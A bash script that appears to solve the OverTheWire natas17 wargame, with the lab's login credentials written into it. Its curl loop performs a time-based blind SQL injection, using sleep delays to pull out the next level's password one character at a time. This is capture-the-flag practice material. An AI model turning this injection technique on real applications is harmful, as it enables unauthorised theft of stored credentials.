#!/usr/bin/env bash

# run until the same password appears twice

password='';
echo "starting brute force attack";

while true; do
    for f in {a..z} {A..Z} {0..9}; do
	reqtime=$(curl -o /dev/null -s -w '%{time_total}\n' -u natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw 'http://natas17.natas.labs.overthewire.org/index.php?debug&username=natas18%22%20and%20password%20like%20binary%20%27'$password$f'%25%27%20and%20sleep%282%29+%23')
	if [[ $reqtime > 2 ]]
	then
	    password=$password$f
	    break
	fi
    done
    echo $password;
done

